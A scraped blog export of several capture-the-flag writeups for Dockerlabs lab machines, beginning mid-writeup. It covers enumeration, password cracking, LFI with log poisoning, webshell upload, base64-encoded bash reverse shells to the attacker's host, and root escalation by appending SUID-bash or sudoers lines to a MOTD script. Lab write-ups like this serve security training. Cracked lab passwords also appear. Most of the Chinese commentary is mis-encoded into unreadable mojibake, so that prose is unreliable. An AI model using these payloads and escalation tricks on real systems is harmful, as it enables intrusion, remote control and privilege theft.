5.8\rNetwork Distance: 1 hop\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.07 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 12.49 seconds FTP #\rå­˜åœ¨åŒ¿åç™»å½•ï¼Œå¹¶ä¸”å¯ä»¥ä¸‹è½½æ–‡ä»¶\nZIP Crack #\r[root@kali] /home/kali/Rutas â¯ zip2john respeta.zip \u0026gt;\u0026gt; zip.hash [root@kali] /home/kali/Rutas â¯ john zip.hash /usr/share/wordlists/rockyou.txt [root@kali] /home/kali/Rutas â¯ cat oculto.txt Consigue la imagen crackpass.jpg\rfirstatack.github.io\rsin fuzzing con logica y observando la sacaras ,muy rapido\rè·å– crackpass.jpg å›¾åƒ\rfirstatack.github.io\ræ— éœ€é€»è¾‘å’Œè§‚å¯Ÿï¼Œæ‚¨å°±èƒ½å¾ˆå¿«æ˜ç™½ã€‚ åœ¨ä»–çš„githubä»“åº“ä¸­å¾—åˆ°è¿™ä¸ªå›¾ç‰‡\nfirstatack.github.io/assets/crackpass.jpg at main Â· firstatack/firstatack.github.io ä½¿ç”¨steghideå°è¯•è¿›è¡Œåˆ†ç¦»ï¼Œä¹Ÿå¯ä»¥ç”¨stegseekæ›´å¿«\n[root@kali] /home/kali/Rutas â¯ steghide extract -sf crackpass.jpg Enter passphrase: wrote extracted data to \u0026#34;passwd.zip\u0026#34;.\r[root@kali] /home/kali/Rutas â¯ unzip passwd.zip\rArchive: passwd.zip\rextracting: pass [root@kali] /home/kali/Rutas â¯ cat pass\rhackeada:denuevo Dirsearch #\r[root@kali] /home/kali/Rutas â¯ dirsearch -u 172.17.0.2 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Rutas/reports/_172.17.0.2/_25-02-22_19-29-36.txt\rTarget: http://172.17.0.2/\r[19:29:36] Starting: [19:29:37] 403 - 275B - /.ht_wsr.txt [19:29:37] 403 - 275B - /.htaccess.bak1 [19:29:37] 403 - 275B - /.htaccess.sample\r[19:29:37] 403 - 275B - /.htaccess.save [19:29:37] 403 - 275B - /.htaccess_extra [19:29:37] 403 - 275B - /.htaccess_orig\r[19:29:37] 403 - 275B - /.htaccessBAK\r[19:29:37] 403 - 275B - /.htaccessOLD2 [19:29:37] 403 - 275B - /.htaccess.orig [19:29:37] 403 - 275B - /.htm\r[19:29:37] 403 - 275B - /.html\r[19:29:37] 403 - 275B - /.htaccess_sc [19:29:37] 403 - 275B - /.htpasswd_test [19:29:37] 403 - 275B - /.htpasswds\r[19:29:37] 403 - 275B - /.httr-oauth [19:29:37] 403 - 275B - /.htaccessOLD [19:29:37] 403 - 275B - /.php [19:29:49] 200 - 615B - /index.php [19:29:49] 200 - 615B - /index.php/login/ [19:29:56] 403 - 275B - /server-status/ [19:29:56] 403 - 275B - /server-status\rTask Completed www-data #\rå­˜åœ¨index.phpï¼ŒæŸ¥çœ‹ç½‘é¡µæºç \nå°†å…¶æ·»åŠ åˆ°**/etc/hosts**\n[root@kali] /home/kali/Rutas â¯ cat /etc/hosts 127.0.0.1 localhost\r127.0.1.1 kali\r::1 localhost ip6-localhost ip6-loopback\rff02::1 ip6-allnodes\rff02::2 ip6-allrouters\r172.17.0.2 trackedvuln.dl vulndb.com dockerlabs.es è®¿é—®trackedvuln.dlä¼šè·³å‡ºä¸€ä¸ªç™»å½•æ¡†ï¼Œä½¿ç”¨ä¸Šé¢çš„è´¦æˆ·è¿›è¡Œç™»å½•\næ²¡æœ‰å¯ä»¥ç›´æ¥åˆ©ç”¨çš„ä¸œè¥¿ï¼Œè¿™é‡Œå¯¹å‚æ•°è¿›è¡Œçˆ†ç ´ï¼Œè®°å¾—å¸¦ä¸ŠHeaderé‡Œçš„token\n[root@kali] /home/kali/Rutas â¯ ffuf -w ../Desktop/fuzzDicts/paramDict/AllParam.txt -u \u0026#39;http://trackedvuln.dl/index.php?FUZZ=../../../../../etc/passwd\u0026#39; -t 50 -H \u0026#34;Authorization : Basic aGFja2VhZGE6ZGVudWV2bw==\u0026#34; -fs 901\r/\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev\r________________________________________________\r:: Method : GET\r:: URL : http://trackedvuln.dl/index.php?FUZZ=../../../../../etc/passwd\r:: Wordlist : FUZZ: /home/kali/Desktop/fuzzDicts/paramDict/AllParam.txt\r:: Header : Authorization: Basic aGFja2VhZGE6ZGVudWV2bw==\r:: Follow redirects : false\r:: Calibration : false\r:: Timeout : 10\r:: Threads : 50\r:: Matcher : Response status: 200-299,301,302,307,401,403,405,500\r:: Filter : Response size: 901\r________________________________________________\rlove [Status: 200, Size: 1079, Words: 172, Lines: 40, Duration: 5ms]\r:: Progress: [74332/74332] :: Job [1/1] :: 7812 req/sec :: Duration: [0:00:10] :: Errors: 0 :: çœ‹æ¥å‚æ•°loveè¿”å›å€¼ä¸å¤ªä¸€æ ·ï¼Œä½†æ˜¯ä¼¼ä¹å¹¶ä¸èƒ½ç›´æ¥è¯»å–åˆ°**/etc/passwd**\nä½†æ˜¯å¥½åƒå¯ä»¥é€šè¿‡PHPä¼ªåè®®è¿›è¡Œæ“ä½œ\nç”±äºGETå‚æ•°ä¼šå­˜åœ¨URLè½¬ä¹‰çš„é—®é¢˜ï¼Œå› æ­¤æˆ‘æ˜¯è¿™æ ·æ„é€ çš„ğŸ‘‡\næ‹¿åˆ°åå¼¹shell\nUser Maria #\rä¸Šä¼ linpeasï¼Œä¼¼ä¹bashå‘½ä»¤æœ‰ç‰¹æ®Šæƒé™\nè¿›å…¥mariaçš„ç›®å½•ï¼Œæ‹¿åˆ°å¯†ç \nä½¿ç”¨sshæˆåŠŸç™»å½•\nRoot #\råœ¨linpeasä¸­å¯ä»¥çœ‹åˆ°**/etc/update-motd.d/00-header**\n/etc/update-motd.d/00-header æ˜¯ä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œç”¨äºåœ¨æ¯æ¬¡ç”¨æˆ·ç™»å½•æ—¶æ˜¾ç¤ºä¿¡æ¯ï¼ˆMessage of the Dayï¼Œç®€ç§° MOTDï¼‰ã€‚å…·ä½“æ¥è¯´ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯ Linux ç³»ç»Ÿä¸­ç”¨äºå®šåˆ¶ç”¨æˆ·ç™»å½•åæ˜¾ç¤ºçš„å†…å®¹çš„ä¸€éƒ¨åˆ†ã€‚\nä¸€èˆ¬æ¥è¯´è¿™ä¸ªè„šæœ¬ä¼šä»¥rootçš„èº«ä»½å¯åŠ¨\nå› æ­¤åªéœ€è¦å‘é‡Œé¢è¿½åŠ ææƒçš„éƒ¨åˆ†å°±è¡Œäº†\necho \u0026#34;cp /bin/bash /home/maria/bash \u0026amp;\u0026amp; chmod u+s /home/maria/bash\u0026#34; \u0026gt;\u0026gt; /etc/update-motd.d/00-header æˆ–è€…è¯´\necho \u0026#39;echo \u0026#34;maria ALL=(ALL) NOPASSWD: ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers.d/maria\u0026#39; \u0026gt;\u0026gt; /etc/update-motd.d/00-header ç„¶åé‡æ–°è¿æ¥sshå³å¯\nSummary #\rUserï¼šFTPåŒ¿åç™»é™†æ–‡ä»¶æ³„éœ²ï¼ŒZIPç ´è§£å¯†ç ï¼Œåˆ†ç¦»å›¾ç‰‡ã€‚æ–‡ä»¶åŒ…å«å¯¼è‡´çš„PHPä¼ªåè®®å‘½ä»¤æ‰§è¡Œï¼Œæˆ‘çœ‹å…¶ä»–çš„Writeupé‡Œé¢æœ‰ç”¨åˆ°filterchainsï¼Œæˆ‘çš„è¿™ä¸ªè¿˜æ˜¯æ¯”è¾ƒç®€å•ã€‚\nRootï¼šç»™ç™»å½•æç¤ºä¿¡æ¯çš„è„šæœ¬ä¸­æ·»åŠ ææƒéƒ¨åˆ†ï¼Œç”±äºè„šæœ¬ä¼šä»¥rootçš„èº«ä»½å¯åŠ¨ï¼Œå› æ­¤å¯ä»¥ç›´æ¥æ‰§è¡Œææƒä»£ç ï¼Œæ–¹æ³•ä¹Ÿæœ‰å¾ˆå¤šã€‚\nPSï¼šæˆ‘çœ‹åˆ°**/homeç›®å½•ä¸‹è¿˜æœ‰å¦ä¸€ä¸ªç”¨æˆ·norberto**ï¼Œæˆ‘å¥½åƒå¹¶æ²¡æœ‰ç”¨åˆ°ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯éé¢„æœŸã€‚\n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-rutas/","section":"Posts","summary":"","title":"Dockerlabs-Rutas","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Veveno â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 16:04 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000089s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 89:9c:7b:99:95:b6:e8:03:5a:6a:d4:69:69:4a:8d:35 (ECDSA)\r|_ 256 ec:ec:90:44:4e:66:64:22:f6:8b:cd:29:d2:b5:60:6a (ED25519)\r80/tcp open http Apache httpd 2.4.58 ((Ubuntu))\r|_http-server-header: Apache/2.4.58 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.95 seconds Gobuster #\r[root@kali] /home/kali/Veveno â¯ gobuster dir -u \u0026#34;http://172.17.0.2/\u0026#34; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html â\r===============================================================\rGobuster v3.6\rby OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart)\r===============================================================\r[+] Url: http://172.17.0.2/\r[+] Method: GET\r[+] Threads: 50\r[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\r[+] Negative Status codes: 404\r[+] User Agent: gobuster/3.6\r[+] Extensions: php,html\r[+] Timeout: 10s\r===============================================================\rStarting gobuster in directory enumeration mode\r===============================================================\r/uploads (Status: 301) [Size: 310] [--\u0026gt; http://172.17.0.2/uploads/]\r/.html (Status: 403) [Size: 275]\r/.php (Status: 403) [Size: 275]\r/problems.php (Status: 200) [Size: 10671]\r/index.html (Status: 200) [Size: 10671]\r/.php (Status: 403) [Size: 275]\r/.html (Status: 403) [Size: 275]\r/server-status (Status: 403) [Size: 275]\rProgress: 661680 / 661683 (100.00%) å¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªproblems.phpï¼Œä½†æ˜¯å›æ˜¾å’Œindex.htmlæ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹éœ€è¦æ„é€ ä¸€ä¸ªå‚æ•°\nFFUF #\rå¯ä»¥çœ‹åˆ°å­˜åœ¨ä¸€ä¸ªbackdoorçš„å‚æ•°\n[root@kali] /home/kali/Veveno â¯ curl --path-as-is \u0026#39;http://172.17.0.2/problems.php?backdoor=/etc/passwd\u0026#39;\rroot:x:0:0:root:/root:/bin/bash\rdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\rbin:x:2:2:bin:/bin:/usr/sbin/nologin\rsys:x:3:3:sys:/dev:/usr/sbin/nologin\rsync:x:4:65534:sync:/bin:/bin/sync\rgames:x:5:60:games:/usr/games:/usr/sbin/nologin\rman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\rlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\rmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\rnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\ruucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\rproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\rwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\rbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\rirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\r_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\rnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\rubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\rsystemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\rsystemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\rmessagebus:x:100:101::/nonexistent:/usr/sbin/nologin\rsystemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin\rsshd:x:101:65534::/run/sshd:/usr/sbin/nologin\rcarlos:x:1001:1001:,,,:/home/carlos:/bin/bash åœ¨**/etc/passwdä¸­æ‰¾åˆ°ä¸€ä¸ªcarlosç”¨æˆ·ï¼Œä½†æ˜¯è¯»å–ä¸åˆ°ssh**å¯†é’¥\nLFI #\råœ¨éå†æ–‡ä»¶çš„æ—¶å€™å‘ç°å¯ä»¥è¯»å–æ—¥å¿—æ–‡ä»¶\nåœ¨User-Agentéƒ¨åˆ†æ’å…¥ä¸€å¥è¯æœ¨é©¬\nå†åŒ…å«æ—¥å¿—æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸€å¥è¯æœ¨é©¬è¢«æ’å…¥æˆåŠŸ\nåå¼¹shell\ncmd=system(\u0026#39;echo \u0026#34;YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS8xMDAgMD4mMQ==\u0026#34;|base64 -d|bash\u0026#39;); åœ¨**/var/www/html**ç›®å½•ä¸‹å¾—åˆ°ä¸€ä¸ªç•™è¨€\nwww-data@fbbc838fa7a8:/var/www/html$ cat anti*\rcat anti*\rEs imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala soy el unico user del sistema. æˆ‘ä¸å¯èƒ½è®°å¾—é€šè¡Œè¯æ˜¯æ— æ³•ç ´è§£çš„ï¼Œä½†æˆ‘çŸ¥é“æˆ‘æŠŠå®ƒæ”¾åœ¨åŒä¸€ä¸ªæ–‡ä»¶é‡Œå·²ç» 24 å¹´äº†ã€‚ æŸ¥æ‰¾24å¹´å‰çš„æ–‡ä»¶\nfind / -type f -mtime +8760 å¾—åˆ°å¯†ç æ˜¯ï¼špinguinochocolatero\næˆåŠŸç™»å½•ssh\nRoot #\rå‘ç°ä¸€ä¸ªéšè—çš„å›¾ç‰‡ï¼Œå°†å…¶ä¸‹è½½å‡ºæ¥\n[root@kali] /home/kali/Veveno â¯ scp carlos@172.17.0.2:/home/carlos/carpeta55/.toor.jpg ./ æŸ¥çœ‹å›¾ç‰‡çš„exifä¿¡æ¯\néšåä½¿ç”¨è¿™ä¸ªå¯†ç æå‡ä¸ºroot\nSummary #\rUserï¼šç»å…¸çš„CTFæ—¥å¿—åŒ…å«ï¼Œå†™å…¥ä¸€å¥è¯é©¬ç„¶ååå¼¹shellï¼Œæ ¹æ®ç•™è¨€æ‰¾åˆ°ä¸€ä¸ªå¯†ç æ–‡ä»¶ï¼Œä»www-dataæå‡åˆ°userã€‚æˆ‘çœ‹å…¶ä»–çš„è§£æ³•å¤§æ¦‚ä¹Ÿæ˜¯å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯ä¸æ˜¯åˆ©ç”¨çš„User-Agentï¼Œè¿™æ˜¯åœ¨CTFä¸­æ¯”è¾ƒå¸¸è§çš„åˆ©ç”¨ç‚¹ã€‚\nDockerlabs machines - Veneno Writeup - Byte Mind\nVeneno , DockerLabs | CTF\u0026rsquo;s Linux Apuntes\nRootï¼šå›¾ç‰‡çš„EXIFä¿¡æ¯æ³„éœ²ï¼Œå¾—åˆ°rootçš„å¯†ç \n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-veveno/","section":"Posts","summary":"","title":"Dockerlabs-Veveno","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/walkingcms â¯ nmap 172.17.0.2 -sV -A\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 09:39 CST\rNmap scan report for 172.17.0.2\rHost is up (0.000090s latency).\rNot shown: 999 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r80/tcp open http Apache httpd 2.4.57 ((Debian))\r|_http-server-header: Apache/2.4.57 (Debian)\r|_http-title: Apache2 Debian Default Page: It works\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.09 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 9.87 seconds è¿›å…¥ç½‘é¡µåæ˜¯apacheçš„é»˜è®¤é¡µé¢\nDirsearch #\r[root@kali] /home/kali/walkingcms â¯ dirsearch -u 172.17.0.2 -t 50 /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/walkingcms/reports/_172.17.0.2/_25-02-22_09-42-07.txt\rTarget: http://172.17.0.2/\r[09:42:07] Starting: [09:42:08] 403 - 275B - /.ht_wsr.txt [09:42:08] 403 - 275B - /.htaccess.sample\r[09:42:08] 403 - 275B - /.htaccess.orig [09:42:08] 403 - 275B - /.htaccess.bak1 [09:42:08] 403 - 275B - /.htaccess_extra [09:42:08] 403 - 275B - /.htaccess_orig\r[09:42:08] 403 - 275B - /.htaccess_sc\r[09:42:08] 403 - 275B - /.htaccess.save\r[09:42:08] 403 - 275B - /.htaccessOLD2 [09:42:08] 403 - 275B - /.htm\r[09:42:08] 403 - 275B - /.html\r[09:42:08] 403 - 275B - /.htaccessBAK [09:42:08] 403 - 275B - /.htpasswd_test\r[09:42:08] 403 - 275B - /.htaccessOLD\r[09:42:08] 403 - 275B - /.htpasswds [09:42:08] 403 - 275B - /.httr-oauth [09:42:09] 403 - 275B - /.php [09:42:28] 403 - 275B - /server-status [09:42:28] 403 - 275B - /server-status/\r[09:42:35] 200 - 11KB - /wordpress/ [09:42:38] 200 - 3KB - /wordpress/wp-login.php\rTask Completed å‘ç°å­˜åœ¨wordpressç›®å½•\nWPscan #\r[root@kali] /home/kali/walkingcms â¯ wpscan --url \u0026#34;http://172.17.0.2/wordpress/\u0026#34; -e å­˜åœ¨ç”¨æˆ·åä¸ºï¼šmarioï¼Œé’ˆå¯¹å…¶è¿›è¡Œå¯†ç çˆ†ç ´\n[root@kali] /home/kali/walkingcms â¯ wpscan --url \u0026#34;http://172.17.0.2/wordpress/\u0026#34; -U username.txt -P /usr/share/wordlists/rockyou.txt å¾—åˆ°å¯†ç ä¸ºï¼šloveï¼Œç™»å½•è¿›å…¥åå°\nRevShell #\rè¿™é‡Œæˆ‘çš„æ€è·¯æ˜¯ä¸Šä¼ ä¸€ä¸ªWebshellç®¡ç†å·¥å…·\nå…ˆåˆ°wordpressçš„æ’ä»¶å¸‚åœºé‡Œéšä¾¿ä¸‹è½½ä¸€ä¸ª\nå¥åº·æ£€æŸ¥ä¸æ•…éšœæ’é™¤ â€“ WordPress æ’ä»¶ | WordPress.org China ç®€ä½“ä¸­æ–‡ ç„¶åå°†webshell.phpæ’å…¥å‹ç¼©åŒ…å†ä¸Šä¼ \nè®¿é—®ä¸‹é¢çš„URLè·¯å¾„å³å¯è¿›è¡Œå‘½ä»¤æ‰§è¡Œ\nhttp://172.17.0.2/wordpress/wp-content/plugins/health-check/webshell.php?cmd= è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯Base64ç¼–ç åå†åå¼¹ï¼Œé¿å…ç‰¹æ®Šå­—ç¬¦çš„å½±å“\necho%20%22YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTcyLjE3LjAuMS8xMDAgMD4mMQ==%22%7Cbase64%20-d%7Cbash åœ¨**/home**ç›®å½•ä¸‹æ²¡æœ‰å‘ç°å…¶ä»–ç”¨æˆ·\næŸ¥çœ‹wp-config.phpèƒ½çœ‹åˆ°æœ‰æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç \n/** Database username */\rdefine( \u0026#39;DB_USER\u0026#39;, \u0026#39;wordpressuser\u0026#39; );\r/** Database password */\rdefine( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;t9sH76gpQ82UFeZ3GXZS\u0026#39; ); ä¸è¿‡é‡Œé¢æ²¡æœ‰ä¸œè¥¿ã€‚\nä¸Šä¼ linpeasæŸ¥çœ‹è¯¦ç»†ä¿¡æ¯\nå‘ç°å­˜åœ¨envçš„å‘½ä»¤\nenv | GTFOBins ç›´æ¥æå‡åˆ°rootæƒé™\nSummary #\rwww-dataï¼šWPscanå¯ä»¥æ‰«æå‡ºwordpresså­˜åœ¨çš„ç”¨æˆ·åï¼Œå†å¯¹å¯†ç è¿›è¡Œçˆ†ç ´ï¼ŒæˆåŠŸç™»å½•åå°ã€‚é€šè¿‡ä¸Šä¼ æ’ä»¶çš„æ–¹å¼åå¼¹shellï¼Œçµæ„Ÿæ¥æºäºã€é¶æœºå®æˆ˜ã€‘WordPress â€“ èŠ±å’²é›¨ç”º é¶æœºè§£é¢˜æ€è·¯ - ææ ¸GetShell\nRootï¼šé€šè¿‡linpeasè¾“å‡ºå‘ç°å¯ä»¥é€šè¿‡envææƒã€‚\n","date":"2025-02-22","externalUrl":null,"permalink":"/posts/2025/02/dockerlabs-walkingcms/","section":"Posts","summary":"","title":"Dockerlabs-WalkingCMS","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/dance-samba â¯ nmap 172.17.0.2 -sV -A\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.5\r| ftp-anon: Anonymous FTP login allowed (FTP code 230)\r|_-rw-r--r-- 1 0 0 69 Aug 19 2024 nota.txt\r| ftp-syst: | STAT: | FTP server status:\r| Connected to ::ffff:172.17.0.1\r| Logged in as ftp\r| TYPE: ASCII\r| No session bandwidth limit\r| Session timeout in seconds is 300\r| Control connection is plain text\r| Data connections will be plain text\r| At session startup, client count was 2\r| vsFTPd 3.0.5 - secure, fast, stable\r|_End of status\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 a2:4e:66:7d:e5:2e:cf:df:54:39:b2:08:a9:97:79:21 (ECDSA)\r|_ 256 92:bf:d3:b8:20:ac:76:08:5b:93:d7:69:ef:e7:59:e1 (ED25519)\r139/tcp open netbios-ssn Samba smbd 4.6.2\r445/tcp open netbios-ssn Samba smbd 4.6.2\rMAC Address: 02:42:AC:11:00:02 (Unknown)\rDevice type: general purpose\rRunning: Linux 4.X|5.X\rOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\rOS details: Linux 4.15 - 5.8\rNetwork Distance: 1 hop\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\rHost script results:\r| smb2-time: | date: 2025-02-21T12:45:31\r|_ start_date: N/A\r| smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required\rTRACEROUTE\rHOP RTT ADDRESS\r1 0.11 ms 172.17.0.2\rOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 22.37 seconds enum4linux #\ræ‰¾åˆ°ç”¨æˆ·åï¼šmacarena\nFTP FileLeak #\rå°è¯•FTPåŒ¿åç™»å½•ï¼Œå¾—åˆ°ä¸€ä¸ªç•™è¨€\n[root@kali] /home/kali/dance-samba â¯ ftp 172.17.0.2 â\rConnected to 172.17.0.2.\r220 (vsFTPd 3.0.5)\rName (172.17.0.2:kali): anonymous\r331 Please specify the password.\rPassword: 230 Login successful.\rRemote system type is UNIX.\rUsing binary mode to transfer files.\rftp\u0026gt; ls\r229 Entering Extended Passive Mode (|||60425|)\r150 Here comes the directory listing.\r-rw-r--r-- 1 0 0 69 Aug 19 2024 nota.txt\r226 Directory send OK.\rftp\u0026gt; get nota.txt\rlocal: nota.txt remote: nota.txt\r229 Entering Extended Passive Mode (|||13977|)\r150 Opening BINARY mode data connection for nota.txt (69 bytes).\r100% |***************************************************************************************************************| 69 556.88 KiB/s 00:00 ETA\r226 Transfer complete.\r69 bytes received in 00:00 (90.81 KiB/s)\rftp\u0026gt; exit\r221 Goodbye.\r[root@kali] /home/kali/dance-samba â¯ ls\rauto_deploy.sh dance-samba.tar dance-samba.zip nota.txt\r[root@kali] /home/kali/dance-samba â¯ cat nota.txt I don\u0026#39;t know what to do with Macarena, she\u0026#39;s obsessed with donald. çœ‹æ¥macarenaå¾ˆå–œæ¬¢donaldï¼Œæˆ–è®¸ä¼šæŠŠä»–çš„åå­—ä½œä¸ºå¯†ç å‘¢ï¼Ÿ\nå°è¯•è¿›å…¥smbæœåŠ¡è·å–åˆ°äº†user.txt\nRoot #\rä½¿ç”¨smbmapå¯ä»¥çœ‹åˆ°å…·æœ‰å†™å…¥æƒé™\nçœ‹èµ·æ¥è¿™ä¸ªsmbæœåŠ¡çš„ç›®å½•æ˜¯ç›´æ¥è¿æ¥åˆ°**/home/macarenaçš„ï¼Œå› æ­¤å¯ä»¥å°è¯•åˆ›å»ºä¸€ä¸ª.sshç›®å½•ï¼Œå¹¶ä¸”ä¸Šä¼ åˆ°é‡Œé¢çš„authorized_keys**ã€‚è¿™é‡Œæˆ‘çš„id_rsa.pubæ˜¯ä¹‹å‰å°±ç”¨è¿‡çš„ï¼Œè¿™é‡Œå°±ä¸é‡æ–°ç”Ÿæˆäº†\nsmb: \\\u0026gt; mkdir .ssh\rsmb: \\.ssh\\\u0026gt; put id_rsa.pub authorized_keys åœ¨homeæ–‡ä»¶å¤¹ä¸‹å‘ç°ä¸€ä¸ªsecret\nå¾—åˆ°å¯†ç ï¼šsupersecurepasswordï¼Œå½“ç„¶è¿™ä¸æ˜¯rootçš„å¯†ç ï¼Œä¸è¿‡å¯ä»¥çœ‹åˆ°macarenaçš„ç‰¹æ®Šå‘½ä»¤\nmacarena@2ee34abfffe4:/home/secret$ sudo -l\r[sudo] password for macarena: Matching Defaults entries for macarena on 2ee34abfffe4:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser macarena may run the following commands on 2ee34abfffe4:\r(ALL : ALL) /usr/bin/file å¯ä»¥å‚è€ƒğŸ‘‡\nFile | GTFOBins æˆ‘å°è¯•è¯»å–äº†rootçš„sshå¯†é’¥ï¼Œç»“æœå¤±è´¥äº†ï¼Œåœ¨**/optç›®å½•ä¸‹å‘ç°ä¸€ä¸ªrootæƒé™çš„password.txt**ï¼Œåˆšå¥½å¯ä»¥é…åˆfileå‘½ä»¤è¿›è¡Œè¯»å–ï¼Œå¯†ç ä¸ºï¼šrooteable2\næå‡ç”¨æˆ·ä¸ºrootå³å¯\nSummary #\rUserï¼šftpçš„åŒ¿åç™»é™†æ³„éœ²æ–‡ä»¶ï¼Œå†é€šè¿‡smbè¯»å–åˆ°user.txt\nRootï¼šä¸€ä¸ªæ¯”è¾ƒç‰¹æ®Šçš„ç‚¹å°±æ˜¯ï¼Œmacarenaçš„smbç›®å½•ä¼¼ä¹å°±æ˜¯ä»–çš„å®¶ç›®å½•ï¼Œå› ä¸ºå¯ä»¥çœ‹åˆ°bashrcã€profileç­‰ç‰¹å®šæ–‡ä»¶ã€‚å› æ­¤å¯ä»¥å†™å…¥sshå¯†é’¥åç™»å½•ã€‚åœ¨**/home/secretç›®å½•ä¸‹æ‹¿åˆ°macarenaçš„å¯†ç 